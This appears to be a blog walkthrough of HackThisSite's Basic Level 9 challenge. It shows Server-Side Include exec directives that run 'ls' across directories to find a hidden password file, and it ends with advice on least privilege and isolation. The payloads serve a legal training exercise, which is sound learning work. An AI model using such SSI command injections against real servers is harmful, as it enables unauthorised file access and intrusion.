---
title: HackThisSite - Basic Level 9 - Cross-Directory SSI Injection
image:
  path: assets/2026-04-26-hackthissite-basic-level-9-cross-directory-ssi-injection/1770832697480.jpg
  alt: Photo by ronnarong thanuthattaphong on Vecteezy
date: 2026-04-26 06:00:00 -0600
categories: [Cybersecurity, Red Team]
tags: [cybersecurity, hackthissite, penetration-testing]     # TAG names should always be lowercase
---

Network Security Sam is going down with the ship 🚢, he’s determined to keep hiding the password file, no matter how many times people manage to recover it. This time, he moved it to:

```
/var/www/hackthissite.org/html/missions/basic/9/
```

However, for this  [challenge](https://www.hackthissite.org/missions/basic/9/) things got a lot trickier as you're only presented with this screen:

![Desktop View](/assets/2026-04-26-hackthissite-basic-level-9-cross-directory-ssi-injection/20260130130252.png)

There’s no obvious input field, so no easy way to test whether this feature is vulnerable to some kind of an injection attack. Still, it turns out that this level is closely related to the [previous one](https://www.hackthissite.org/missions/basic/8/), so go back and from there you must figure out a way to list the contents of this directory: 

```
/var/www/hackthissite.org/html/missions/basic/9/
```

But how do you do that?. 

Well, in [level 8](https://www.hackthissite.org/missions/basic/8/) you escaped the `tmp/` folder by moving one directory up using this SSI directive: 

```
<!--#exec cmd="ls .." -->
```

That allowed you to list everything inside:

```
/var/www/hackthissite.org/html/missions/basic/8/
```

Now, what if instead of escaping just `tmp/`, you also escape the `8/` folder by moving **two** directories up?: 

```
<!--#exec cmd="ls ../../" -->
```

That will lead you to: 

```
/var/www/hackthissite.org/html/missions/basic/
```

And maybe, from there, the directory structure might follow this pattern: 

```
/var/www/hackthissite.org/html/missions/basic/1
...
...
...
/var/www/hackthissite.org/html/missions/basic/7
/var/www/hackthissite.org/html/missions/basic/8
/var/www/hackthissite.org/html/missions/basic/9
...
```

If that assumption is correct, you can easily inject the following SSI directive in **level 8’s input field** to list the contents of `9/`, something like this: 

```
<!--#exec cmd="ls ../../9/" -->
```

![Desktop View](/assets/2026-04-26-hackthissite-basic-level-9-cross-directory-ssi-injection/20260130133819.png)

And this would be the result: 

![Desktop View](/assets/2026-04-26-hackthissite-basic-level-9-cross-directory-ssi-injection/20260130134717.png)

Now, to obtain Sam's password, simply append the highlighted file to the path where Sam stored the password file:

```
https://www.hackthissite.org/missions/basic/9/p91e283zc3.php
```

And there it is:

![Desktop View](/assets/2026-04-26-hackthissite-basic-level-9-cross-directory-ssi-injection/20260130134930.png)

Once again, Sam’s password has been recovered. This time, it is: `22d0694a`

## Security Recommendations

Web applications should be treated as isolated units, with strict permissions preventing one application or directory from accessing another, even if they share the same server.

Web servers should enforce the principle of **least privilege** at the filesystem level, ensuring that each application is restricted to its own directory structure and cannot traverse or access unrelated paths. Proper isolation mechanisms such as separate system users, virtual hosts, containers, or chroot environments, should be implemented to ensure access is restricted to a single application context, limiting this way the potential impact of a compromise and reducing the overall attack surface.
